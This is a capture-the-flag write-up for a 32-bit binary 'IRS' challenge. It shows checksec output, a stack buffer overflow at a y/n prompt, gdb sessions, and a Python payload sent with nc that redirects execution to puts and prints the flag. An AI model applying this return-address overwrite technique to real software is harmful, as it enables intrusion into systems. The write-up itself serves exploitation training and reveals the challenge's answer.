# Pennsylvania - IRS - Exploit - 100
## Problem Description
> Good day fellow Americans. In the interest of making filing your tax returns as easy and painless as possible, we've created this nifty lil' program to better serve you! Simply enter your name and file away! And don't you worry, everyone's file is password protected ;)
> 
> nc irs.pwn.republican 4127

We are provided a stripped ELF 32-bit LSB executable, Intel 80386. 


```
$ checksec ./irs
[!] Couldn't find relocations against PLT to get symbols
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

```

Running strings on the file reveals the string "not_the_flag". This is the password for viewing Donald Trump’s tax returns on the given binary. So the goal is to force the program to output this string somehow. Stepping through the output in gdb reveals that this string is located at 0x804c03a.

## Finding an Exploit
I tested for easy buffer overflows or string format vulns before even taking a look at the assembly.


There is indeed a buffer overflow in the edit function, when it asks for y/n confirmation.

```
y/n
AAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
Your changes have been recorded!


Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```
So the instruction pointer gets overridden after 25 characters. We have control of esp contents, ebp, and eip

Taking a look at the functions, we have

- View tax return: 0x804892C
 -   0x804893a : Call 0x80484f8 ( puts )
 -   0x804895c: Call printf
 -   0x8048981 : printf
 -   0x80489a6 : printf
 -   0x80489cb : printf
 -   0x80489db : puts


```
$ python -c "import struct; print('1\n1\n1\n1\n1\n3\n1\n1\n1\n1\n' + '\x00' * 25 + struct.pack('i', 0x804892C))" | ./irs
...
--------------------------------------------------------------------------------
Segmentation fault (core dumped)
```




Great! We can redirect the program flow to the view taxes function. It begins printing the first line with all the dashes. It then crashes early since the parameters are incorrect.


Although, using this entire function isn't even necessary. Since we know the memory address of the flag, we can just call puts() on its location and pass the memory address as the parameter.


- call puts: 0x804893a
- puts: 0x80484f8
- flag: 0x0804c03a


So if we can set the top of esp to 0x0804c03a and then jump to 0x804893a, we will get the flag. Of course, the flag location may change, but we’ll get to that later.



```
(gdb) r
…
^C
(gdb) i r
…
esp            0xffffcd78    0xffffcd78
...
(gdb) set *0xffffcd78=0x804c03a
(gdb) jump *0x804893a
Continuing at 0x804893a.
not_the_flag


Program received signal SIGSEGV, Segmentation fault.
0x08048951 in ?? ()
```



So it works in theory; now to try it using the buffer overflow
```
(gdb) !python -c "import struct; print('1\n1\n1\n1\n1\n3\n1\n1\n1\n1\n' + '\x00' * 25 + struct.pack('i', 0x80489db) + struct.pack('i', 0x804c03a))" > attack
(gdb) r < attack
…
Deductible: 1
y/n
Your changes have been recorded!
not_the_flag


Program received signal SIGSEGV, Segmentation fault.
0x080489e4 in ?? ()
```




## Determining the Offset

It works in gdb! However, something seems to be offset when running it on the binary without gdb, as it fails to print this string. The not_the_flag variable must have been loaded into a different location. But it is still calling the puts function successfully.
We can try using the address of what we found when running strings on the binary instead.
Looking back at the binary, the variable is located at 0xac2
```
$ xxd irs | grep not
00000ac0: c700 6e6f 745f c740 0474 6865 5fc7 4008  ..not_.@.the_.@.
```
The .text base address for x86 systems is 0x8048000, so this variable’s location when loaded into the program should be 0x8048000 + 0xac2 = 0x8048ac2

```
python -c "import struct; print('1\n1\n1\n1\n1\n3\n1\n1\n1\n1\n' + '\x00' * 25 + struct.pack('i', 0x80489db) + struct.pack('i', 0x8048ac2))" | nc irs.pwn.republican 4127
...
y/n
Your changes have been recorded!
flag�@{c4n�_1_g�@
                  3t_a�@_r3f�@und}�
```

flag{c4n_1_g3t_a_r3fund}
